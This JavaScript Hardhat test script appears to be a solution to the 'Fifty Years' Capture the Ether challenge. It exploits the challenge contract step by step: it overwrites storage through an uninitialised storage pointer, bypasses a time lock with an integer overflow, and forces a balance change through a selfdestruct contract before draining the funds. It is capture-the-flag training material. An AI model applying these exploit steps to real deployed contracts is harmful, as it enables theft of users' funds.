const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x6B05Bc728f925De972AB89b2378782dC8f5251B0";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("FiftyYearsChallenge");
  fiftyYears = factory.attach(CHALLENGE_ADDRESS);
  console.log("This challenge is a three step process");
});

it("FiftyYears", async function () {
  console.log(
    "Uninitialised `Contribution storage contribution` will always modify value of storage slot 0 and 1"
  );
  console.log(
    "Passing value as 1 to expand the length of array to 2 and timestamp as 2**256 - 1 day so that subsequent deposit can"
  );
  console.log("bypass the check of timepass due to overflow");
  const MAX_INT_sub_one_day = BigInt(2 ** 256) - BigInt(24 * 3600);
  console.log(MAX_INT_sub_one_day);
  console.log(
    "length of queue, ",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 0)
  );
  console.log(
    "head is ",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1)
  );
  console.log("Calling upsert with value 1 and timestamp MAX_INT_sub_one_day");
  const tx1 = await fiftyYears.upsert(1, MAX_INT_sub_one_day, { value: 1 });
  await tx1.wait();
  console.log(
    "Length of array is",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 0)
  );
  console.log(
    "head is ",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1)
  );

  console.log(
    "Calling upsert with value 2 and timestamp 0, to reset head at 0"
  );
  const tx2 = await fiftyYears.upsert(3, 0, { value: 3 });
  await tx2.wait();
  console.log(
    "head is ",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1)
  );

  console.log(
    "Balance of contract is:",
    await ethers.provider.getBalance(fiftyYears.address)
  );
  console.log(
    "total of contract > balance, so we exclude last index for withdrawal"
  );
  const withdraw = await fiftyYears.withdraw(2);
  await withdraw.wait();
  console.log(
    "Balance of contract is:",
    await ethers.provider.getBalance(fiftyYears.address)
  );
  console.log(
    "head is ",
    await ethers.provider.getStorageAt(CHALLENGE_ADDRESS, 1)
  );

  console.log(
    "we force the balance to increase by 2 wei by using selfdestruct contract"
  );
  const factory1 = await ethers.getContractFactory("RetirementFundHack");
  retirementFundHack = await factory1.deploy({ value: 2 });
  await retirementFundHack.deployed();
  console.log("Self destruct contract deployed");
  console.log("calling self destruct");
  const tx = await retirementFundHack.attackRetirementFund(fiftyYears.address);
  await tx.wait();

  console.log("withdrawing remaining amount of wei from contract");
  const withdraw2 = await fiftyYears.withdraw(3);
  await withdraw2.wait();
  const isComplete = await fiftyYears.isComplete();
  expect(isComplete).to.be.true;
  util.updateTotalPoints(scriptName);
});
